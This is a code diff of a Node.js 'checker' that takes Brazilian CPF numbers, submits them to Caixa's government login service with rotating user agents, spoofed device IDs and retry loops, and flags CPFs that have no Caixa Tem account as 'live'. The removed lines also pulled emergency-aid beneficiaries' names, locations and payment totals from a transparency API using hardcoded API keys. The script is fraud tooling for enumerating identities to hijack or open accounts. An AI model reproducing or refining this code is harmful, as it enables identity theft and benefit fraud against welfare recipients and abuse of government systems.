@@ -1,18 +1,9 @@
 const cheerio = require('cheerio');
-const { req } = require('../../../utils/checkers');
 const conf = require('../../../utils/checkers');
-const { sleep } = require('../../../utils/conf');
 const RequesT = conf.req
 const Agent = conf.useragent
 const Sleep = conf.sleep;
 
-
-function getKey() {
-
-    const keys = ['9acca336c7ca63304675637980f032e5', 'aaa833693000f79f6e6acfbca219a00f']
-    
-    return keys[Math.floor(Math.random() * keys.length)];
-}
 
 function create_UUID(){
     var dt = new Date().getTime();
@@ -25,8 +16,6 @@ function create_UUID(){
 }
 
 async function checker(test){
-
-    Sleep(0.099)
 
     if(test != ''){
          
@@ -42,100 +31,33 @@ async function checker(test){
 		return {success:false, test: {user: test}}
 	}
 
-    try {
-
-        while (true) {
-            const key = getKey();
-            try {
-
-                var req1 = await RequesT(
-                    'get',
-                    'http://www.transparencia.gov.br/api-de-dados/auxilio-emergencial-por-cpf-ou-nis?codigoBeneficiario=' + test + '&pagina=1',
-                    {'Accept': 'application/json','chave-api-dados': key}
-                )
-        
-                if (req1.response.data['Error API'] || req1.response.status != 200) {
-                    sleep(3)
-                    continue
-                }
-                break
-
-            } catch(err) {
-                continue
-            }
-        }
-
-        if (req1.response.data.length == 0) {
-    
-            return {success:false, status:'die', test: {user: test}, info: 'SEM BENEFICIO |'}
-
-        } else if (req1.response.data[0].enquadramentoAuxilioEmergencial.descricao == 'BOLSA FAMILIA') {
-                
-            return {success:false, status:'die', test: {user: test}, info: 'BOLSA FAMILIA |'}
-
-        } else if (req1.response.data[0].situacaoAuxilioEmergencial.descricao == 'Pagamento bloqueado ou cancelado') {
-                
-            return {success:false, status:'die', test: {user: test}, info: 'PAGAMENTO BLOQUEADO OU CANCELADO |'}
-
-            
-
-        } else {
-
-            var results = {
-                name : req1.response.data[0].beneficiario.nome,
-                estado: req1.response.data[0].municipio.uf.nome,
-                cidade: req1.response.data[0].municipio.nomeIBGE,
-                enquadramentoAuxilioEmergencial: req1.response.data[0].enquadramentoAuxilioEmergencial.descricao,
-                mesDisp: '',
-                numParcelas: req1.response.data.length,
-                valorTotal: 0,
-                telefone: undefined,
-            }
-    
-            if (req1.response.data[0].beneficiario.nis == '00000000000'){
-                results.telefone = 'VINCULADO'
-            } else {
-                results.telefone = 'NÃO VINCULADO'
-            }
-    
-            req1.response.data.forEach(parcela => {
-
-                if (parcela.numeroParcela == '1ª') {
-                    results.mesDisp = parcela.mesDisponibilizacao
-                }
-    
-                results.valorTotal += parcela.valor
-            })
-        }
-
-    } catch(err) {
-    }
-    
     while (true) {
 
         try {
+
     
             const deviceId = create_UUID();
             const UserAgent = await Agent()
             
-            const req2 = await RequesT(
+            const req1 = await RequesT(
                 'get', 
                 'https://login2.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=04298408612&state=eK3J5ly669UzRJknjBm-EA&scope=offline_access&code_challenge=HlmMlnmzT9UWfpm5JxHD6CYol_T2bqTYmW5DAQeq3aw&code_challenge_method=S256&deviceId='+ deviceId +'&so=Android&app=br.gov.caixa.tem%3Bvertical%3Dhttps%3A%2F%2Fmobilidade.cloud.caixa.gov.br%3Bruntime%3Dmfp&origem=mf&nivel=10', 
                 {'User-Agent': UserAgent}
             );
 
-            if(req2.success = true) {
-                if (req2.response.status !== 200) {
-                    Sleep(1)
+            if(req1.success = true) {
+                if (req1.response.status !== 200) {
+                    console.log('req1 blocada')
+                    Sleep(2)
                     continue
                 }
             } else {
                 continue
             } 
     
-            if (req2.response.status == 200) {
+            if (req1.response.status == 200) {
     
-                const $ = cheerio.load(req2.response.data);
+                const $ = cheerio.load(req1.response.data);
                 var sessionId = $('#sessionId');
                 var secondUrl = $('form');
                 sessionId = sessionId.attr('value');
@@ -144,9 +66,9 @@ async function checker(test){
                 try {
 
                     while(true) {
-                        Sleep(0.9)
+                        Sleep(0.1)
     
-                        const req3 = await RequesT('post', secondUrl, {
+                        const req2 = await RequesT('post', secondUrl, {
                             'Referer': 'https://login.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=',
                             'User-Agent': UserAgent,
                             'Content-Type': 'application/x-www-form-urlencoded',
@@ -155,23 +77,22 @@ async function checker(test){
                             'f10=&fingerprint=8c1621f80e9eb066d24ebff9e9238a1c&step=1&situacaoGeolocalizacao=&latitude=&longitude=&username='+test
                         )
 
-                        if(req3.success = true){
-                            if (req2.response.status !== 200) {
-                                Sleep(0.85)
+                        if(req2.success = true){
+                            if (req1.response.status !== 200) {
+                                console.log('req2 blocada')
+                                Sleep(1)
                                 continue
                             }
                         }
                         
-                        if (req3.response.data.includes('o existe cadastro para o CPF informado.')) {
-                            var _results = 'nome: ' + results.name + ' | cidade: ' + results.cidade + ' | UF: ' + results.estado
-                            _results += ' | tipo de conta: ' + results.enquadramentoAuxilioEmergencial
-                            _results +=  ' |mês disponibilização: ' + results.mesDisp
-                            _results += ' | numero de parcelas: ' + results.numParcelas + ' | valor total: R$' + results.valorTotal
-                            _results += ' | telefone: ' + results.telefone + ' | cadastro cxtem: SEM CADASTRO >> CHECKER AUX'
+                        if (req2.response.data.includes('o existe cadastro para o CPF informado.')) {
+                            var _results = 'CPF SEM CADASTRO'
         
                             return {success:true, status:'live', test: {user: test}, info: _results}
         
                         } else {
+                            var _results = 'CPF COM CADASTRO'
+
                             return {success:false, status:'die', test: {user: test}, info: _results}
                         }
                     }
